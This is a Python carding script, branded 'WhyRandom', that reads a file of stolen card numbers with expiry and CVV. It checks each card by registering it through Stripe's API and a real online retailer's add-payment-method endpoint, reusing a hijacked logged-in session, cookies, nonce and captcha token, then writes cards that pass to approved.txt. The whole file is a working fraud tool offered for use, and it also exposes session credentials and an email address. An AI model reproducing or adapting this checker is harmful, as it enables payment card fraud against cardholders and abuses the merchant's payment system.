import requests
import re
import time
from colorama import Fore
from bs4 import BeautifulSoup
import pyfiglet
import os

try:
    import requests, re, time
    from colorama import Fore
    from bs4 import BeautifulSoup
    import pyfiglet
    import os
except ImportError:
    os.system('pip install requests')
    os.system('pip install re')
    os.system('pip install time')
    os.system('pip install colorama')
    os.system('pip install bs4')
    os.system('pip install pyfiglet')

Z = '\033[1;31m'
F = '\033[2;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'
W = Fore.WHITE
L = Fore.BLUE
print(Z + "□■" * 30)

ascii_art = pyfiglet.figlet_format("   WhyRandom ")
print(L + ascii_art)
print(F + "□■" * 30)

print('\t\033[1;31m>>> Join Me Channel WhyRandom')
path = input("Enter You cc combo  :  ")
start = 0
with open(path) as file:
    lino = file.readlines()
    lino = [line.rstrip() for line in lino]

def check_card(e):
    cc = e.split('|')[0]
    mm = e.split('|')[1]
    yy = e.split('|')[2][-2:]
    cvv = e.split('|')[3]
    card = e.replace('\n', '')

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-AE,ar;q=0.9,en-VI;q=0.8,en;q=0.7,en-US;q=0.6',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    data = f'type=card&billing_details[name]=+&billing_details[email]=elonkla.rk0%40gmail.com&card[number]={cc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=2f356027-038a-4152-998a-6d77015f39f3f7ac1f&muid=18796444-b342-404c-bafa-668a0c33fe45f033c0&sid=6a10e0cc-7cd9-407a-9dfc-3951c8b65923ba29f4&pasted_fields=number&payment_user_agent=stripe.js%2F23733a2a86%3B+stripe-js-v3%2F23733a2a86%3B+card-element&referrer=https%3A%2F%2Fgourmetwarehouse.net&time_on_page=42314&key=pk_live_e6XrOnvvu6HBrh5qmF8ublCz&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoidVBqQ1BqWStnRUN6RDVVa3pnSHNrL2tMaTh0QzYyV2l1WXgzdXZZWFR6VVNUM3ArdFdEV05XWVlwcjF5V1I5K1hpNm9qUzZVYjhpOUFTQ1VHcCtyZjdQcVdBRmRoazdPT1hzQ1FUNDFQRFNtcTVwZnpNVGVXQWlNYlFFWGZhclc1UXRWd3FNY0NFbVdaTm80alA1MFJKV2hzd2s5RXVkNE1WemFaS3Q1OFoybm1lR29XOU1lK1RnZE1iSmZzY0V6Rmx0cjdJYW1HRm1zdXMySU93RFg5blNEZWEzSEt3am01NXptSGJmeE4wblJJYVgyVGcxMUJBTjkvYXNHRmV1RHJQZVBLTVpHVTlyOEFCeWx3cy9QTDI5dm9UUis1WDNRWU9lWURKQS9CUDZYNlBOaUhxd2FSTGV4bS82L1dvMVFFWTRuVk5UTGJ5amg0UmRvSlJiVVVvbS9FSlhucHo2RWdUbURaZVc2eENoejNkUUwwR25VcllpSkdmbG5UcXdPSXZ4dEZYMkFyOGZ1OWw5bjQ1RUlaNnlBcEdmQTU0WEZGYTZHY3J3RTlBaVVsVlNNcitpM24rNU1NWUgyeTBtWU92bVZEbjR2ZUg5ZG8yOU9OeVp0VEdMTC9zdkx4NWtJV0E2R3hyWjNkeUFhUmVPaUc5ekdwSmpOclJMb2pWVCtpSk1Hd1F4dzdPRndnSlRKenBDMlRNOHZxa2lzTzlxekRmaXlYRzBwSmNFQnRpRkJvZGVXZlkrWWI2UVhJTlhDQks3UVBQVzZ1Q3huN3FReDNROGxJeFBZbTJHUTdiejJ5ak5PWG1BR1pmeXBDaXdLdGpieGFXZ01vQXhmQmFtMDgzSWszSnFOVFFLTm5OZ0E4SmovM0dtTXNYRmkyZVB5V0VNRTF4cFBQRnlRRzFWYytLSHdXVURBSnFKZEFXZHdGVnZJb0gzQ1FSV1pCTGFwdlZZMGxJODN5UTZNVG1aRVd3R1JoOXh0elJRQXRJeld1dmRkTWkrcmhKSkRqK21xaFBaYXI1ZGR6UlZPQkp4SkM0L0llbDcxSjZrNmNJVGR2eldma0k4Y1RoenpRY2lneWc5ZUhVMlNhUWZPODlVNUROUjdVazVyMHlRVVAwK1BkaDNnMi95SzdDUklvUHQ2dlZXTUY5dlNZZTlPSk9uVk96VzQyV29kNDNKUDFTM3RYaEZGNDlyTHQwYVhROW1OY3lWZzdTcTVqUkxyNFB3Q0gyTnU2bzFYV2hHZXFoTStQbFVBNi92eUNXZlZaK3hLcjM5RmdVMENpYThpZzFBK0pOQ050NXFReERyQkpMVTJTS1BEZU1pMXcySTFrellURTJib0JMZEI0U1VDc2lhWExQeldKSnNLdTVENmQ3UzZJeDFVZUl6TVlpSCtYN1dPLzZYREdJNWhnRGV5bnVrVFRCQkNCUCtpSmhncjFWWmNZeW1HSis2SVltZ1plRUxHakdZWk0ycXBUY1ZMNEtXVnRWQmxqZjRHT1FpRk5jczZvT29TbE5YOTVoeFJWaHN4K2RRbWtCTzhxWXZScCt2ajY2SmpxOHovUTVsamQwTkE3THAvdWFWaGdFZUlxMGVIU1VjN000UzZibWc0Vzg4MzZIbUhXb2xCMXh3YXp3WkZNbW4rYU1MZ1ZYZkpodGxSSGNLTTd5bUlhcDlzYmNSNjJMZzliWk10Rm9IcVJZbENraFFJd3JZZ0F3R1pKZndxUlJvbklVY0hIdm5mZUZ1enJTcjVMSlM3VHdpQWF0b3YvMkU4YjFEeXhmWGRncUpEaUhyTEVTQlFyWThCaE13L3RBaUtsRzY5S2VkZUNIVENnYk51cFhhMHdTak5TRXZGVUQ1VkVuQWZRMGFpZFVmb1R4cC9POEljS1dRWk9ZRFpsemllaGFHaVRxa0s5cUQ2SW1KMFZRN2ZOYkE0aDkwRzB5ekg1SlNMWHUrTEFUUm0za0dOdkV6UWlNL2gxbHdBYUFlOFpFcWxQQ1VkdG9ZcUd2TGVlQVdDUEt6ckxkbmQ3emFYTFM2SXFQUGtNYWdzUHp5dzdkV3VKK1U0ckxoRE04WEkxbmdnc2I4Znl1M3Z2ZkhORTlpTk1oNW5ienVvYXlnS2dMSm9lRnZtcS9MSy9HQXpnTldFa1I1a3FYbVRONWJ5d28xNTJPeEpqZ3cyUDNJNkdwczRjSGtJRXlUM3lSc055eGNVeEU5RkZqN1laRHh1Y3ZiblJaVUZWZWJwMk4vU1VNZjV1UEtXV3FCMHNHb0xqdHYzV3NhZnlFNlNSdlBOQzM4UnN3Q3NHMmRGSDBZV0x2VGFGMUF1V3NwS2prYWk3STZ2Q29aMTRpVllYOVdiNmpMVkFaYWdhNVVZWVp4NnRXbjgyRW9TQ1VwcTRkcHk2L3ArOWxvd2lQYTZCUVdSUjN6dlQvendmaEhGZWxoeHJJK3I4czRjSVAzWTM4L1UzTmNoc0dvTEhJQTZrSXk5c1ZXLzRNSWJYUThCUUJ4NHMrSURTektsSm9adVoyN3M3Mm1MTlFpeEFwKzE0VzZWcEgwanIxN203WW5EZ0Fvc0lRYk9XcGd6V3NVSXJSaEJJcDdrTXhMbWxvY3JzYnRoQnphMVd6di9mTTlyQis1R1pXL1RVMERSR29ramNxL0tnQkk4dmFpQ0R5dGY0WjRWUVVEeGU0Y0J4Ymo4M0pvYW52cWsrZ1pDbC9IQkU0NmZ6QXVxdW1JdVF0aXg4UDBNamVGWCtmRnRPRXpJQmNsaGRIeXR0TVdMZGFKZ3IvbWFOdWxROWJaa1Y1eU9tRk1WNWxsU1lGcE5qWVROUW14c3VWUmszSmluR2Y5bS8vZVk0WmFUdStKRElMZGFFY3k3Q1ZsTEk3eFFXSUJSN3RKK045bXJoT2VEYzR3VzloaUk3QUlrMzFVbkRNL3RaVFk3MkRBM2Rra1NiQzV1VkIyQVU2cUtDOFg1Q2xaZXh0SnpjOS9adWtVQ3pSVzRhdGhGUkFndGFUeTdXSW52Rng5Y2ViOVVzZ0RZZE0vem1IWjhoQ0taN2RVMWZLVjk5YjhKMUE9PSIsImV4cCI6MTcyODUzNjczMSwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiJhMWQ4YTk2IiwicGQiOjAsImNkYXRhIjoiMGkxQmVjclVSUWU5TFZwTis5cGY1aWpEaVpjQzgzNTVjNEhhY2o4UFgycGI5anNBeVN0Q0JXK1BpWHVyUFVmNms5dnhEUy93TWFTNmw2RTlaRGpCdmVEeEJ5TUdpMW1OcXU5T1JRZjQ4elRCOFVOQmdwazc3Y3BVK3RQUXNZUTFPbDJUaWIvSTVON012ajF0ajdtVHZuM1UzOUdlWGg0VnZXOUx3WVVmbU4wbWhqWmg1Z25BK1BiKzU5RURCQmo0N2hKKzhpNFBOOHlKWWtwQSJ9.YK5jVuxzsLwbAO05XhKe_RHSoJ_muqupIf6CGavI4W8'
	
    try:
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        response_json = response.json()
        if 'id' in response_json:
            id = response_json['id']
        else:
            print(f'{e} >>> Your card number is incorrect ❌')
            return

        cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fgourmetwarehouse.net%2Fmy-account',
    '_fbp': 'fb.1.1728491139702.110218120161635261',
    'tk_or': '%22%22',
    'tk_r3d': '%22%22',
    'tk_lr': '%22%22',
    'tk_ai': 'CQsnlPUJ7SfLXtdg6HgOfRIz',
    '__stripe_mid': '18796444-b342-404c-bafa-668a0c33fe45f033c0',
    'mailchimp_user_previous_email': 'elonkla.rk0%40gmail.com',
    'mailchimp_user_email': 'elonkla.rk0%40gmail.com',
    'breeze_folder_name': '810b5fe16fb10a997509e9e42b62a55ce3f15992',
    'wordpress_logged_in_92fe12b0ab6285b923c634af4cf7a165': 'elonkla.rk0%7C1729706961%7CblnF5XFeClb6CpySLJxeXzz8qTPgpB1Eka13KDsT22c%7C53e8073129196e2f453633544fb46a96095d4eb3e5a01eedba8cbbfa599826c0',
    'mcfw-wp-user-cookie': 'NDgxMnwwfDYzfDQwMDEyXzIwZTk3NDY4NWNhZTliMjk5OGIyMDhkMTY2MmVhMTg2ZTk5ODgwZDcyYjcyN2ZlOTY2NDk1ZWE2MTg1OTNiMWU%3D',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-10-10%2005%3A03%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fgourmetwarehouse.net%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-10-10%2005%3A03%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fgourmetwarehouse.net%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fgourmetwarehouse.net%2Fmy-account%2Fadd-payment-method%2F',
    'tk_qs': '',
    '__stripe_sid': '6a10e0cc-7cd9-407a-9dfc-3951c8b65923ba29f4',
}

        headers = {
            'authority': 'gourmetwarehouse.net',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://gourmetwarehouse.net',
            'referer': 'https://gourmetwarehouse.net/my-account/add-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
            'stripe_source_id': id,
            'nonce': '5bff861ec9',
        }

        response = requests.post('https://gourmetwarehouse.net/?wc-ajax=wc_stripe_create_setup_intent', params=params, cookies=cookies, headers=headers, data=data)
        print(response.text)
        response = response.text
        
        if 'Your card could not be set up for future usage' in response:
            print(f'{e}  >>> Your Card Was Declined ❌')
        else:
            print(f'{e} >>> Approved ✅')
            with open('approved.txt', 'a') as approved_file:
                approved_file.write(f'{e}\n')

    except KeyError:
        print(f'{e} >>> Your card number is incorrect ❌')
    except Exception as ex:
        print(f'Error occurred: {str(ex)}')

for card in lino:
    check_card(card)